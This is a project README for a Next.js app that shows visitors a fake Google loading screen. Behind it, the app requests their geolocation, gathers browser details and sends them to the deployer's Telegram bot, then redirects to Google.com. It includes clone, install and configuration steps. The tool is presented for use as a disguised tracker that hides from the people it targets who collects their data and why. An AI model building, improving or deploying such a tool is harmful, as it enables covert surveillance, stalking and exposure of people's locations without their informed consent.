# Location Tracker with Google Redirect

A Next.js application that collects user location and browser information in the background and redirects to Google.com.

## Features

- Collects user's geolocation data
- Gathers browser information
- Sends collected data to Telegram bot
- Automatically redirects to Google.com
- Dark mode loading screen
- Built with Next.js and TypeScript

## Setup

1. Clone the repository:
```bash
git clone git@github.com:hashanCB/findLocationOnClick.git
cd findLocationOnClick
```

2. Install dependencies:
```bash
npm install
```

3. Create a `.env` file in the root directory with your Telegram bot credentials:
```env
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=your_telegram_bot_token
NEXT_PUBLIC_TELEGRAM_CHAT_ID=your_chat_id
```

4. Run the development server:
```bash
npm run dev
```

## How It Works

1. When a user visits the page, they see a dark-themed Google loading screen
2. In the background, the app:
   - Requests user's location permission
   - Collects browser information
   - Sends data to configured Telegram bot
3. After 1.5 seconds, redirects to Google.com

## Tech Stack

- Next.js 15.3.0
- TypeScript
- Tailwind CSS
- Axios for API calls

## Environment Variables

Required environment variables:

- `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN`: Your Telegram bot token
- `NEXT_PUBLIC_TELEGRAM_CHAT_ID`: Your Telegram chat ID

## Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License.
